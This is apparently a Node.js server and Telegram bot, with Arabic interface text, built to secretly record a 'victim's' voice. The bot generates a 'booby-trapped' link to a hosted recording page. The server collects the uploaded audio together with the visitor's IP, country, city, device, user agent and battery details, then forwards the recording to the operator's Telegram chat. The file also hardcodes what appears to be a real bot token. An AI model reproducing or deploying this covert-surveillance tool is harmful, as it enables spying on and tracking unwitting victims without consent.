const express = require('express');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const { Telegraf } = require('telegraf');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const botToken = '7244359397:AAELs6eOA3t03zH7w2g2EXIaNHdXSBMOEWc'; // Replace with your actual bot token
const bot = new Telegraf(botToken);

const app = express();

const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.urlencoded({ extended: true }));


app.use(express.static(__dirname));

app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const { chatId, ip, country, city, platform, userAgent, batteryLevel, batteryCharging, deviceVersion } = req.body;
    const voicePath = req.file.path;

    // يمكنك استخدام هذه المعلومات الإضافية لتسجيلها أو استخدامها في أي منطق تريده
    console.log('Received voice message with the following additional info:');
    console.log(`IP: ${ip}`);
    console.log(`Country: ${country}`);
    console.log(`City: ${city}`);
    console.log(`Platform: ${platform}`);
    console.log(`User Agent: ${userAgent}`);
    console.log(`Battery Level: ${batteryLevel}`);
    console.log(`Battery Charging: ${batteryCharging}`);
    console.log(`Device Version: ${deviceVersion}`);

    bot.sendVoice(chatId, voicePath).then(() => {
        fs.unlinkSync(voicePath); 
        res.send('Voice submitted successfully!');
    }).catch(error => {
        console.error(error);
        res.status(500).send('Error sending voice message.');
    });
});

app.get('/record', (req, res) => {
  res.sendFile(path.join(__dirname, 'record.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

bot.start((ctx) => {
  const chatId = ctx.chat.id;
  const message = 'مرحباً بك في بوت تسجيل صوت الضحيه\n المطور @VlP_12 ';
  ctx.reply(message, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'حدد مدة التسجيل', callback_data: 'select_duration' }],
      ],
    },
  });
});

bot.on('callback_query', (ctx) => {
  const chatId = ctx.chat.id;

  if (ctx.callbackQuery.data === 'select_duration') {
    ctx.reply('من فضلك أدخل مدة التسجيل بالثواني (1-20):');
  }
});

bot.on('message', (ctx) => {
  const chatId = ctx.chat.id;
  const duration = parseInt(ctx.message.text, 10);

  if (!isNaN(duration)) {
    if (duration > 0 && duration <= 20) {
      const link = `https://ye-mm.onrender.com/record?chatId=${chatId}&duration=${duration}`;
      ctx.reply(`تم تلغيم الرابط  لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
    } else {
      ctx.reply('الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
    }
  }
});

bot.launch();